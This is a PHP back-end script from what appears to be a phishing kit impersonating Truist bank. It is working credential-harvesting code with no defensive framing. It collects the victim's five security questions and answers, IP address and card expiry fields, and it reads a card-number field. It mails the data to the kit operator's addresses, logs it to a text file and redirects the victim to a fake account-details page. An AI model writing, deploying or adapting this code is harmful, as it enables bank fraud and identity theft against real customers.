<?php
$zabi = getenv("REMOTE_ADDR");
include('email.php');
$message .= "--------------[ Question ]---------------------\n";
$message .= "Question 1     : ".$_POST['Q1']."\n";
$message .= "Answer 1       : ".$_POST['A1']."\n";
$message .= "Question 2     : ".$_POST['Q2']."\n";
$message .= "Answer 2       : ".$_POST['A2']."\n";
$message .= "Question 3     : ".$_POST['Q3']."\n";
$message .= "Answer 3       : ".$_POST['A3']."\n";
$message .= "Question 4     : ".$_POST['Q4']."\n";
$message .= "Answer 4       : ".$_POST['A4']."\n";
$message .= "Question 5     : ".$_POST['Q5']."\n";
$message .= "Answer 5       : ".$_POST['A5']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "--------------------------------\n";
$cc = $_POST['ccn'];
$subject = "Truist [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: TRUIST0HER0- <contact>\r\n";
mail($email,$subject,$message,$headers);
mail(','.$form,$subject,$message,$headers);

$file = fopen("Z.txt", 'a');



fwrite($file, $message);

header("Location: em.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
?>
